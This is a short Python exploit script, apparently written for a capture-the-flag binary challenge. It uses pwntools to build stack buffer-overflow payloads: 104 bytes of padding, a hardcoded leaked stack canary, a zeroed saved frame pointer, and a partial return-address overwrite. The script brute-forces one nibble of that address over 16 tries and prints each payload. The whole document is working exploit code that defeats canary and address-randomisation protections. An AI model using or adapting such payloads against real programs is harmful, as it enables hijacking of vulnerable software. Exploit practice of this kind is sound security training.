from pwn import *

for i in range(0, 16):
    canary = b'\x00Q\x7f]\xe94\xc9%'
    payload = b'a' * 104 + canary + p64(0) + b'\x29' + bytes([16 * i + 2])
    print(payload)